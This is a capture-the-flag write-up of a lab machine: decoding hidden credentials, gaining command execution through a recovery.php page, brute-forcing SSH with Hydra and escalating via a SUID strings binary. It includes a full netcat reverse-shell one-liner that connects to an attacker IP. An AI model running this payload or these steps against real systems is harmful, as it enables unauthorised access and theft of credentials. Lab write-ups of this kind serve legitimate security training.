## Scanning
We performed an nmap scan of all ports, with scripts and software versions.

## Enumeration
We tried to access the website from the browser, but it will not open.

But, if we try **curl** we will see the content of the site, there is a string in **base64**.

Decode the message, you will get a password.

We access the file *"recovery.php "*, there we will have to decode another message, this time it will be more complicated.

We access the site with the hint, we see a famous *"dinosaur"*. After reading the message and the image, we already sense what we have to do.

#### Download stego.jpg image

Let's try the other image... And we got credentials.

Searching through **Google**, we found this [tutorial](https://www.ryadel.com/en/firefox-this-address-is-restricted-override-fix-port/
) that explains how to change the port to browse **Firefox**, so we follow the guide, access the file *"recovery.php"* and use the credentials obtained.

## Exploitation
We make a small one and check that we can execute commands.

#### Reverse shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f
```
We will use the above *payload + URL-Encode* to obtain a shell on the victim machine.

We access the *"/home/"* and find a list of passwords for the user *"Jack"*.

![](11.png)

We use the **Hydra** tool to obtain the correct password in just seconds.

![](12.png)

We access by **SSH**, we enumerate a file *"user.jpg"*. We transfer it to our machine and read the user flag.

#### Evidence user flag

## Abuse of privileges
We launch the **lse.sh** tool, enumerate the uncommon SUID *strings* binary.

![](15.png)

We look for information, we see that it is possible to load a variable with an arbitrary path and to be able to execute **strings** to read its content. 

First, I tried to read the file *"id_rsa"* of the root user, but it does not exist. So a quick option is to read the flag directly.
